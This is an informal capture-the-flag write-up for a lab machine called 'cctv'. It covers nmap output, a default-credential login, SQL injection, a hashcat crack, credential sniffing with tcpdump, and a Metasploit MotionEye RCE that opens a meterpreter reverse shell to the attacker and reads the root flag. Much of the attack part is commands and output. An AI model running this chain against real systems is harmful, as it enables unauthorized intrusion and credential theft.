network enumeration:

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDZ15GCLPzC4gTM0nqzpUbr/2L77bM1C9sbBecivQPX/KcKvJrP88peCJXwTug7T/EORHr7M7JeHtMQJ6hYihFA=
80/tcp open  http    syn-ack Apache httpd 2.4.58
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

hell no i just type admin:admin i get dashboard and found v1.37.63 

then found the cve and other resource then:

if do sqlmap and found username and password:

after hashcat

```
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
```

  
CCTV stack uses containerized services communicating internally.

capturing all traffic :

```
tcpdump -i any -nn 

port 5000 is hit frequently so :

mark@cctv:~$ tcpdump -i any -nn -A tcp port 5000

E..g.!@.@..(.......
.>.. 'Cs.. .....X......
u&%.....USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status
10:11:16.616594 vethf19addd P   IP 172.25.0.10.5000 > 172.25.0.11.35646: Flags [.], ack 52, win 509, options [nop,nop,TS val 784641 ecr 1965434325], length 0
E..4..@.@.
```


then login into it:

```
sa_mark@cctv:~$ ls
'SecureVision Staff Announcement.pdf'   user.txt
sa_mark@cctv:~$ cat user.txt
3622bd6d84732dfc96801149725b5714
```


the pdf have info :

![[Pasted image 20260308161542.png]]

and then :
  
From previous LinPEAS output, localhost port 8765 is open. Forward it: 

```
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

It exposes the MotionEye CCTV management app, and the hint suggests we can reuse the sa_mark password:

```
admin / X1l9fx1ZjS7RZb
```

```
msf > use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set RPORT 8765
RPORT => 8765
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set PASSWORD X1l9fx1ZjS7RZb
PASSWORD => X1l9fx1ZjS7RZb
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set LHOST tun0
LHOST => tun0
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > run
[*] Started reverse TCP handler on 10.10.15.4:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected version 0.43.1b4, which is vulnerable
[*] Adding malicious camera...
[+] Camera successfully added
[*] Setting up exploit...
[+] Exploit setup complete
[*] Triggering exploit...
[+] Exploit triggered, waiting for session...
[*] Sending stage (3090404 bytes) to 10.129.2.184
[*] Meterpreter session 1 opened (10.10.15.4:4444 -> 10.129.2.184:35150) at 2026-03-08 16:20:12 +0545
[*] Removing camera
[+] Camera removed successfully

meterpreter > getuid
Server username: root
meterpreter > cat /root/root.txt
f040655fd2935c56b86c8163de21a8bf
```



https://4xura.com/writeups-for-ctfs/htb/


# Overview of the Attack Chain

The box follows a **realistic pentest path**:


```
Recon → Web Exploitation → Database Dump → SSH Access
→ Network Sniffing → Lateral Movement → RCE → Root
```

Main vulnerabilities:

1. **Default credentials**
2. **SQL Injection (CVE-2024-51482)**
3. **Weak password cracking**
4. **tcpdump capability abuse**
5. **Internal credential sniffing**
6. **Password reuse**
7. **MotionEye RCE (CVE-2025-60787)**

